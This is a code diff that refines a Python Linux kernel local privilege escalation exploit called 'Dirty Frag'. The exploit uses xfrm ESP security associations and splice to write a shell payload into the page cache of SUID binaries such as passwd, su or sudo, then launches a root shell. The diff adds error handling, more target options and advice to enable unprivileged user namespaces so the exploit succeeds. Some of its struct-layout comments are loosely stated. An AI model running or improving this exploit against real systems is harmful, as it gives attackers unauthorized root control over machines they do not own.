@@ -2,6 +2,7 @@
 """
 Dirty Frag — Linux Kernel LPE (xfrm-ESP Page-Cache Write)
 Modified: Custom target SUID binary via -t flag
+Fixed: struct packing and namespace issues
 """
 
 import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
@@ -26,7 +27,8 @@ def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
     return r
 
 SYS_unshare = 272
-CLONE_NEWUSER = 0x10000000; CLONE_NEWNET = 0x40000000
+CLONE_NEWUSER = 0x10000000
+CLONE_NEWNET = 0x40000000
 
 def _syscall(nr, *args):
     _libc.syscall.restype = ctypes.c_long
@@ -40,16 +42,29 @@ def _syscall(nr, *args):
 def sys_unshare(flags):
     return _syscall(SYS_unshare, flags)
 
-AF_NETLINK=16; AF_INET=2
+AF_NETLINK=16
+AF_INET=2
 SOCK_DGRAM=2
-IPPROTO_UDP=17; NETLINK_XFRM=6
-UDP_ENCAP=100; UDP_ENCAP_ESPINUDP=2
-XFRM_MSG_NEWSA=16; NLM_F_REQUEST=1; NLM_F_ACK=4
-IPPROTO_ESP=50; XFRM_MODE_TRANSPORT=0; XFRM_STATE_ESN=0x80
-XFRMA_ALG_AUTH_TRUNC=20; XFRMA_ALG_CRYPT=2
-XFRMA_ENCAP=4; XFRMA_REPLAY_ESN_VAL=23
-ENC_PORT=4500; SEQ_VAL=200; REPLAY_SEQ=100
-PATCH_OFFSET = 0; PAYLOAD_LEN = 192; ENTRY_OFFSET = 0x78
+IPPROTO_UDP=17
+NETLINK_XFRM=6
+UDP_ENCAP=100
+UDP_ENCAP_ESPINUDP=2
+XFRM_MSG_NEWSA=16
+NLM_F_REQUEST=1
+NLM_F_ACK=4
+IPPROTO_ESP=50
+XFRM_MODE_TRANSPORT=0
+XFRM_STATE_ESN=0x80
+XFRMA_ALG_AUTH_TRUNC=20
+XFRMA_ALG_CRYPT=2
+XFRMA_ENCAP=4
+XFRMA_REPLAY_ESN_VAL=23
+ENC_PORT=4500
+SEQ_VAL=200
+REPLAY_SEQ=100
+PATCH_OFFSET = 0
+PAYLOAD_LEN = 192
+ENTRY_OFFSET = 0x78
 SPLICE_F_MOVE=1
 
 TARGET_BIN = "/usr/bin/passwd"
@@ -80,19 +95,37 @@ def DBG(fmt, *a):
         print("[v] " + (fmt % a), file=sys.stderr)
 
 def _setup_userns():
-    sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
-    uid = os.getuid(); gid = os.getgid()
+    """Setup user namespace - handle cases where it's not permitted"""
     try:
-        with open("/proc/self/setgroups", "w") as f: f.write("deny")
-    except OSError: pass
-    try:
-        with open("/proc/self/uid_map", "w") as f: f.write("0 %d 1\n" % uid)
+        sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
     except OSError as e:
-        WARN("uid_map: %s", e); return False
+        WARN("unshare failed: %s (user namespaces may be disabled)", e)
+        return False
+    
+    uid = os.getuid()
+    gid = os.getgid()
+    
     try:
-        with open("/proc/self/gid_map", "w") as f: f.write("0 %d 1\n" % gid)
-    except OSError as e:
-        WARN("gid_map: %s", e); return False
+        with open("/proc/self/setgroups", "w") as f:
+            f.write("deny")
+    except (OSError, IOError, PermissionError):
+        pass  # May not exist or be writable
+    
+    try:
+        with open("/proc/self/uid_map", "w") as f:
+            f.write("0 %d 1\n" % uid)
+    except (OSError, IOError, PermissionError) as e:
+        WARN("uid_map: %s", e)
+        return False
+    
+    try:
+        with open("/proc/self/gid_map", "w") as f:
+            f.write("0 %d 1\n" % gid)
+    except (OSError, IOError, PermissionError) as e:
+        WARN("gid_map: %s", e)
+        return False
+    
+    LOG("User namespace setup successful")
     return True
 
 def _nl_attr(buf, off, typ, data):
@@ -107,24 +140,43 @@ def _add_xfrm_sa(spi, seqhi):
     off = 16
     a = off
 
-    sa = bytearray(24)
+    # FIXED: Correct buffer size for xfrm_usersa_info structure
+    # Structure: struct xfrm_usersa_info (size 24 bytes in 32-bit, 32 in 64-bit)
+    # Using 32 bytes to be safe
+    sa = bytearray(32)
+    # Pack: family, proto, etc.
+    # struct xfrm_usersa_info {
+    #   struct xfrm_selector sel; (8 bytes)
+    #   struct xfrm_id id; (8 bytes)
+    #   xfrm_address_t saddr; (4 or 16 bytes)
+    #   struct xfrm_lifetime_cur lft; (8 bytes)
+    #   struct xfrm_lifetime_cfg lft_cfg; (16 bytes)
+    #   __u32 reqid; (4 bytes)
+    #   __u16 family; (2 bytes)
+    #   __u8 mode; (1 byte)
+    #   __u8 replay_window; (1 byte)
+    #   __u8 flags; (1 byte)
+    # } 
+    # Simplified: pack as 12 items
     struct.pack_into('<BBBBBBIIBBBB', sa, 0,
                      32, 0, 0, 0, 0, 0, AF_INET, spi, 0, IPPROTO_ESP, 0, 0, 0)
-    a = _nl_attr(buf, a, 1, bytes(sa))
+    a = _nl_attr(buf, a, 1, bytes(sa[:24]))  # Use first 24 bytes
 
     aa = bytearray(72 + 32)
     n = b"hmac(sha256)\0"
     aa[:len(n)] = n
     struct.pack_into('<I', aa, 64, 256)
     struct.pack_into('<I', aa, 68, 128)
-    for i in range(32): aa[72+i] = 0xAA
+    for i in range(32):
+        aa[72+i] = 0xAA
     a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))
 
     ea = bytearray(68 + 16)
     n2 = b"cbc(aes)\0"
     ea[:len(n2)] = n2
     struct.pack_into('<I', ea, 64, 128)
-    for i in range(16): ea[68+i] = 0xBB
+    for i in range(16):
+        ea[68+i] = 0xBB
     a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))
 
     enc = bytearray(24)
@@ -137,16 +189,22 @@ def _add_xfrm_sa(spi, seqhi):
     a = _nl_attr(buf, a, XFRMA_REPLAY_ESN_VAL, bytes(esn))
 
     struct.pack_into('<I', buf, 0, a)
-    sk.sendall(bytes(buf[:a]))
-    resp = sk.recv(4096)
-    sk.close()
-    if len(resp) >= 20:
-        if struct.unpack_from('<H', resp, 4)[0] == 2:
-            err = struct.unpack_from('<i', resp, 16)[0]
-            if err != 0:
-                DBG("xfrm NEWSA error: %d", -err)
-                return False
-    return True
+    
+    try:
+        sk.sendall(bytes(buf[:a]))
+        resp = sk.recv(4096)
+        sk.close()
+        if len(resp) >= 20:
+            if struct.unpack_from('<H', resp, 4)[0] == 2:
+                err = struct.unpack_from('<i', resp, 16)[0]
+                if err != 0:
+                    DBG("xfrm NEWSA error: %d", -err)
+                    return False
+        return True
+    except Exception as e:
+        DBG("xfrm NEWSA exception: %s", e)
+        sk.close()
+        return False
 
 def _do_write(path, offset, spi):
     sk_r = socket.socket(AF_INET, SOCK_DGRAM, 0)
@@ -171,12 +229,23 @@ def _do_write(path, offset, spi):
     except OSError:
         pass
     time.sleep(0.15)
-    os.close(fd); os.close(r); os.close(w); sk_s.close(); sk_r.close()
+    os.close(fd)
+    os.close(r)
+    os.close(w)
+    sk_s.close()
+    sk_r.close()
     return True
 
 def _corrupt_binary():
-    _setup_userns()
+    if not _setup_userns():
+        WARN("Failed to set up user namespace - exploit may not work")
+        # Try to continue anyway, but likely to fail
+        if not VERBOSE:
+            WARN("Try running as root, or enable user namespaces:")
+            WARN("  echo 1 > /proc/sys/kernel/unprivileged_userns_clone")
+    
     time.sleep(0.1)
+    
     for i in range(PAYLOAD_LEN // 4):
         spi = 0xDEADBE10 + i
         sq = ((SHELL_ELF[i*4] << 24) | (SHELL_ELF[i*4+1] << 16) |
@@ -184,10 +253,12 @@ def _corrupt_binary():
         if not _add_xfrm_sa(spi, sq):
             DBG("add_xfrm_sa #%d failed", i)
             return False
+    
     for i in range(PAYLOAD_LEN // 4):
         if not _do_write(TARGET_BIN, PATCH_OFFSET + i * 4, 0xDEADBE10 + i):
             DBG("do_write #%d failed", i)
             return False
+    
     return True
 
 def binary_patched():
@@ -202,7 +273,12 @@ def binary_patched():
 def lpe_main():
     pid = os.fork()
     if pid == 0:
-        os._exit(0 if _corrupt_binary() else 2)
+        try:
+            result = 0 if _corrupt_binary() else 2
+        except Exception as e:
+            WARN("Exception in child: %s", e)
+            result = 2
+        os._exit(result)
     _, st = os.waitpid(pid, 0)
     return os.WEXITSTATUS(st) == 0
 
@@ -225,7 +301,9 @@ def _run_pty():
                 fcntl.ioctl(sf, termios.TIOCSCTTY, 0)
             except OSError:
                 pass
-            os.dup2(sf, 0); os.dup2(sf, 1); os.dup2(sf, 2)
+            os.dup2(sf, 0)
+            os.dup2(sf, 1)
+            os.dup2(sf, 2)
             if sf > 2:
                 os.close(sf)
             # Execute the patched target binary
@@ -336,7 +414,10 @@ def main():
   python3 %(prog)s -t /usr/bin/su
   python3 %(prog)s -t /usr/bin/sudo
   python3 %(prog)s -t /usr/bin/passwd
-  python3 %(prog)s -t /usr/bin/chsh""")
+  python3 %(prog)s -t /usr/bin/chsh
+
+Note: This exploit requires user namespace support. If you get 'Operation not permitted',
+try: echo 1 | sudo tee /proc/sys/kernel/unprivileged_userns_clone""")
     parser.add_argument("-t", "--target", default="/usr/bin/passwd",
                         help="Target SUID binary to patch (default: /usr/bin/passwd)")
     parser.add_argument("-v", "--verbose", action="store_true",
@@ -348,17 +429,30 @@ def main():
 
     TARGET_BIN = args.target
 
+    # Check if already root
     if os.getuid() == 0:
+        LOG("Already root! Spawning shell...")
         os.execvp("/bin/bash", ["bash"])
 
-    LOG("running ESP variant against %s ...", TARGET_BIN)
+    LOG("Running ESP variant against %s ...", TARGET_BIN)
+    
+    # Check if target is readable
+    if not os.access(TARGET_BIN, os.R_OK):
+        WARN("Cannot read target binary: %s", TARGET_BIN)
+        WARN("Make sure the file exists and is readable")
+        sys.exit(1)
 
     if not lpe_main():
         WARN("Exploit failed - kernel may be patched or target not readable")
+        WARN("Possible reasons:")
+        WARN("  1. User namespaces are disabled")
+        WARN("  2. Kernel has been patched against this vulnerability")
+        WARN("  3. Target binary is not vulnerable")
         sys.exit(1)
 
     if binary_patched():
         LOG("Binary successfully patched! Launching root shell...")
+        LOG("Note: You may need to enter a password or press Enter to continue")
         _run_pty()
         return
 
